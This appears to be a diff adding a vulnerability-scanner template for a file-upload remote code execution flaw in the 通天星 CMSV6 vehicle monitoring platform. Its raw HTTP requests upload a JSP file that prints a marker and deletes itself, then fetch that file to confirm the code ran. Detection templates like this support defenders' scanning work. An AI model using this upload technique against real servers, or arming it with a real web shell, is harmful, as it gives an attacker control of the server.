@@ -1,0 +1,61 @@
+id: gsky-server-fileupload
+
+info:
+  name: 通天星CMSV6车载定位监控平台 inspect_file 文件上传致远程代码执行漏洞
+  author: chaitin
+  severity: critical
+  description: |
+    通天星CMSV6车载定位监控平台是一种先进的车辆监控系统，提供实时定位、视频监控和车辆管理功能，用于提高车辆安全和运营效率。2024年3月，互联网上披露通天星CMSV6车载定位监控平台存在文件上传漏洞，攻击者可利用该漏洞获取服务器控制权限。该漏洞利用简单，建议受影响的客户尽快修复漏洞。
+  tags: 808gps,fileupload
+flow: |
+  http("r0") && http("r1")
+
+variables:
+  rfilename: "{{rand_base(4)}}"
+  r1: "{{rand_base(8)}}"
+  rboundary: "{{rand_base(8)}}"
+
+http:
+  - id: "r0"
+    raw:
+      - |
+        POST /inspect_file/upload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="uploadFile"; filename="{{rfilename}}.jsp"
+        
+        <% out.println("{{r1}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundary{{rboundary}}--
+        
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body,"/upload/software/")
+        condition: and
+
+    extractors:
+      - type: regex
+        part: body
+        name: filename
+        group: 1
+        regex:
+          - 'filePath":"/upload/software/(.*?).jsp'
+        internal: true
+
+  - id: "r1"
+    raw:
+      - |
+        GET /upload/software/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+        
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body,"{{r1}}")
+        condition: and
+
